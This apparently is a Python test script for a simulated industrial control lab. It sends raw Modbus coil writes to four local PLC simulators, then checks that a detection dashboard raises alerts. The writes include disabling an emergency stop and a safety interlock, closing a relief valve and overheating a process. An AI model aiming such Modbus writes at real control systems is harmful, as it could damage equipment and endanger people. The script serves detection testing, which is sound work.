#!/usr/bin/env python3
"""
Test visual alerts across ALL 4 PLCs
"""
import socket
import struct
import time
import requests

def modbus_attack(port, coil, value, desc):
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect(('127.0.0.1', port))

        coil_value = 0xFF00 if value else 0x0000
        request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, coil, coil_value)
        sock.send(request)
        response = sock.recv(1024)
        sock.close()

        return len(response) >= 12 and response[7] == 0x05
    except Exception as e:
        return False

print('''
╔══════════════════════════════════════════════════════════════╗
║  Testing Visual Alerts Across ALL 4 PLCs                    ║
╚══════════════════════════════════════════════════════════════╝
''')

attacks = [
    {'plc': 'PLC-1 (Tank)', 'port': 5502, 'coil': 0, 'value': True, 'desc': 'Turn pump ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-1 (Tank)', 'port': 5502, 'coil': 3, 'value': False, 'desc': 'Close valve', 'severity': 'WARNING'},

    {'plc': 'PLC-2 (Pressure)', 'port': 5503, 'coil': 0, 'value': True, 'desc': 'Turn compressor ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-2 (Pressure)', 'port': 5503, 'coil': 4, 'value': False, 'desc': 'Close relief valve', 'severity': 'CRITICAL'},

    {'plc': 'PLC-3 (Temperature)', 'port': 5504, 'coil': 0, 'value': True, 'desc': 'Turn heater ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-3 (Temperature)', 'port': 5504, 'coil': 2, 'value': False, 'desc': 'Turn cooler OFF', 'severity': 'CRITICAL'},

    {'plc': 'PLC-4 (Safety)', 'port': 5505, 'coil': 0, 'value': False, 'desc': 'Disable emergency stop', 'severity': 'CRITICAL'},
    {'plc': 'PLC-4 (Safety)', 'port': 5505, 'coil': 1, 'value': False, 'desc': 'Disable safety interlock', 'severity': 'CRITICAL'},
]

print('Executing attacks on all 4 PLCs...\n')

for i, attack in enumerate(attacks, 1):
    severity_icon = '🚨🚨' if attack['severity'] == 'CRITICAL' else '⚠️ '
    print(f"[{i}/8] {severity_icon} {attack['plc']}: {attack['desc']}")

    success = modbus_attack(attack['port'], attack['coil'], attack['value'], attack['desc'])

    if success:
        print(f"      ✓ Attack successful on port {attack['port']}")
    else:
        print(f"      ✗ Attack failed")

    time.sleep(0.3)

print('\nWaiting for alerts to process...')
time.sleep(2)

print('\n' + '═'*70)
print('  SECURITY ALERTS FROM ALL 4 PLCs')
print('═'*70 + '\n')

try:
    r = requests.get('http://127.0.0.1:5000/api/security/alerts', timeout=3)
    data = r.json()

    if data['success'] and data['total'] > 0:
        print(f'Total alerts generated: {data["total"]}\n')

        # Group by PLC
        by_plc = {}
        for alert in data['alerts']:
            plc = alert.get('plc', 'Unknown')
            if plc not in by_plc:
                by_plc[plc] = []
            by_plc[plc].append(alert)

        # Show alerts grouped by PLC
        for plc in sorted(by_plc.keys()):
            print(f'\n{plc} Alerts:')
            print('-' * 70)

            for alert in by_plc[plc][-4:]:  # Last 4 per PLC
                severity_icons = {
                    'CRITICAL': '🚨🚨',
                    'HIGH': '⚠️ ',
                    'WARNING': '⚠️ '
                }
                icon = severity_icons.get(alert['severity'], '  ')

                severity_colors = {
                    'CRITICAL': '\033[91m',  # Red
                    'HIGH': '\033[93m',      # Yellow
                    'WARNING': '\033[93m'    # Yellow
                }
                color = severity_colors.get(alert['severity'], '')
                reset = '\033[0m'

                print(f'{icon} {color}[{alert["timestamp"]}] {alert["severity"]:<10}{reset}')
                print(f'   {alert["message"]}')

        print('\n' + '═'*70)
        print('✅ ALL 4 PLCs ARE DETECTING ATTACKS!')
        print('═'*70)

    else:
        print('✗ No alerts generated')

except Exception as e:
    print(f'✗ Error fetching alerts: {e}')

print('''
\n╔══════════════════════════════════════════════════════════════╗
║  Visual Verification in Web UI                              ║
╚══════════════════════════════════════════════════════════════╝

Open browser: http://localhost:5000/process
Login: admin / admin

You should see:
  • Red pulsing alert banner for CRITICAL attacks
  • Orange banner for WARNING attacks
  • Alert history showing attacks from ALL 4 PLCs
  • Each alert labeled with which PLC (PLC-1, PLC-2, PLC-3, PLC-4)

Try attacking different PLCs and watch alerts appear:
  python3 attack.py

All 4 PLCs now have visual alert detection! 🎉
''')
